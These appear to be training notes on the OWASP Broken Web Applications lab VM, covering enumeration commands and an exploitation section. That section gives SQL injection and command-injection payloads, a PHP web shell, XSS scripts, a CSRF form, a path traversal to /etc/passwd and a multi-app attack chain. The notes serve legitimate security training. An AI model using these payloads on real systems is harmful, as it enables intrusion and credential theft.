# 1. Introduction to OWASP BWA

## What OWASP BWA Is

- A pre‑built VM containing multiple intentionally vulnerable web applications
- Designed for training, research, and safe exploitation practice
- Includes DVWA, Mutillidae, WebGoat, WebWolf, and others
- Provides a unified environment for multi‑app attack chains

## Why BWA Matters

- Lets you practice **cross‑application recon**
- Simulates a real server hosting multiple apps
- Provides a consistent environment for web exploitation
- Excellent for practicing recon → enumeration → exploitation → reporting

## What BWA Is NOT

- Not a modern secure web server
- Not representative of hardened enterprise systems
- Not meant for production use

# 5. Enumeration Workflows

## Directory Enumeration

```bash
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt
```

### What to Look For

- `/dvwa/`
- `/mutillidae/`
- `/webgoat/`
- `/webwolf/`
- `/phpmyadmin/`
- `/test/`
- `/uploads/`

---

## Parameter Enumeration

```bash
wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt --hl 0 http://<IP>/dvwa/vulnerabilities/sqli/?id=FUZZ
```

---

## Cookie & Session Enumeration

```bash
curl -I http://<IP>
```

Look for:

- `PHPSESSID`
- `security` cookie
- `JSESSIONID`

---

## Header Enumeration

```bash
curl -I http://<IP>
```

Look for:

- Server version
- X‑Powered‑By
- Missing security headers

---

## Database Enumeration

- MySQL default creds
- phpMyAdmin
- Config files with plaintext passwords

# 7. Exploitation Workflows

Below are **school‑level explanations** + **real‑world parallels**.

---

## SQL Injection (Classic)

### Manual Testing

```bash
curl "http://<IP>/dvwa/vulnerabilities/sqli/?id=1'-- -&Submit=Submit"
```

---

## SQL Injection (Blind)

### Boolean‑Based

```bash
1' AND 1=1-- -
1' AND 1=2-- -
```

### Time‑Based

```bash
1' AND SLEEP(5)-- -
```

---

## Command Injection

### Test Payloads

```bash
127.0.0.1; whoami
127.0.0.1 && id
127.0.0.1 | uname -a
```

---

## File Upload Bypass

### Upload PHP Shell

```php
<?php system($_GET['cmd']); ?>
```

### Bypass Filters

- Change extension
- Modify MIME type
- Use polyglots

---

## XSS (Reflected)

```bash
<script>alert(1)</script>
```

---

## XSS (Stored)

```bash
"><script>alert('pwned')</script>
```

---

## CSRF

### Example Attack Form

```html
<form action="http://<IP>/mutillidae/index.php?page=change-password.php" method="POST">
  <input type="hidden" name="password_new" value="hacked">
  <input type="hidden" name="password_conf" value="hacked">
  <input type="submit">
</form>
```

---

## Path Traversal

```bash
?page=../../../../etc/passwd
```

---

## Multi‑App Attack Chains

### Example Chain

1. SQLi in DVWA → dump credentials
2. Reuse creds in Mutillidae → admin login
3. File upload in Mutillidae → RCE
4. Pivot to WebGoat → session hijacking
5. Use WebWolf → exfiltration
